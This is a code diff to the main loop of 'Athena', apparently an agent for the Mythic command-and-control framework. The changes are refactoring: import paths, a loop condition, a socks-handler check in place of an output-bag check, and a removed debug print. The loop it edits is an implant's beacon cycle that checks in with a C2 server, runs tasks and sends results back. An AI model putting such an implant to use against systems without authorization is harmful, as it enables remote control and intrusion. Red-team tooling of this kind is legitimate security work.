@@ -1,11 +1,11 @@
 ﻿using Athena.Commands;
-using Athena.Mythic.Model.Checkin;
-using Athena.Mythic.Model;
 using Athena.Utilities;
 using System.Collections.Generic;
 using System.Threading;
 using System.Threading.Tasks;
 using System;
+using Athena.Models.Mythic.Checkin;
+using Athena.Models.Mythic.Tasks;
 
 namespace Athena
 {
@@ -24,7 +24,7 @@ namespace Athena
             CheckinResponse res = Globals.mc.CheckIn();
             
             //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
-            while((res.status != "success"))
+            while(res.status != "success")
             {
                 //Attempt checkin again
                 res = Globals.mc.CheckIn();
@@ -110,14 +110,13 @@ namespace Athena
                         }
                     }
                     //Return output if server is accessible
-                    if (hasoutput.Count > 0 || Globals.bagOut.Count > 0)
+                    if (hasoutput.Count > 0 || Globals.socksHandler.Count() > 0)
                     {
                         //Did the POST send properly?
                         //Should I return the object and handle all the parsing shit out here?
                         if (Globals.mc.SendResponse(hasoutput))
                         {
-                            //Clear out delegates array
-                            //Globals.delegateMessages.Clear();
+
                             //Remove sent commands from the Global job Dictionary or clear out taskresult of long running tasks
                             foreach (var job in hasoutput.Values)
                             {
@@ -137,10 +136,6 @@ namespace Athena
                                     }
                                 }
                             }
-                        }
-                        else
-                        {
-                            Console.WriteLine("False");
                         }
                     }
                     //Get sleep and go
